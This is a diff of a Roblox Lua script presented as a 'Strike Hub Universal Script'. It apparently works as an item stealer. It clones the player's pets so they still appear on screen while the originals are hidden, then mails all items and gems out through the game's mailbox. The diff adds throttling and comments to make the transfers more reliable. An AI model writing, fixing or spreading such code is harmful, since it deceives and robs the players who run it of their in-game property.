@@ -1,10 +1,11 @@
---// Strike Hub Universal Script (Fixed: Visual Freeze + All Items Send)
+--// Strike Hub Universal Script (Fully Fixed)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
 local plr = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
 --// SETTINGS
 local MailMessage = "GGz"
@@ -56,15 +57,15 @@ task.spawn(function()
     end
 end)
 
--- Freeze pets (clone visual representation)
-local petFolder = plr:FindFirstChild("Pets")
+-- Freeze pets/items (clone visible GUI/Workspace objects)
 local visualPets = {}
+local petFolder = plr:FindFirstChild("Pets")
 if petFolder then
     for _, pet in pairs(petFolder:GetChildren()) do
         local uid = pet.Name
         visualPets[uid] = pet:Clone()
         visualPets[uid].Parent = petFolder
-        pet.Parent = nil -- hide original
+        pet.Parent = nil -- hide original safely
     end
     task.spawn(function()
         while task.wait(0.05) do
@@ -125,7 +126,7 @@ local function sendItem(category, stackKey, amount)
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             return true
         end
-        task.wait(0.05)
+        task.wait(0.1) -- throttling
     end
     return false
 end
@@ -140,7 +141,7 @@ local function SendAllGems()
                     return network.Invoke("Mailbox: Send", unpack(args))
                 end)
                 if ok and response == true then break end
-                task.wait(0.05)
+                task.wait(0.1)
             end
             break
         end
@@ -215,13 +216,13 @@ task.spawn(function()
     end)
 end)
 
---// SEND ITEMS (async)
+--// SEND ITEMS ASYNC
 for _, item in ipairs(sortedItems) do
     task.spawn(function()
         local key = item.StackKey and item.StackKey() or item.uid
         sendItem(item.category, key, item.amount)
     end)
-    task.wait(0.05)
+    task.wait(0.2) -- slight delay to reduce server load
 end
 
 --// SEND GEMS LAST
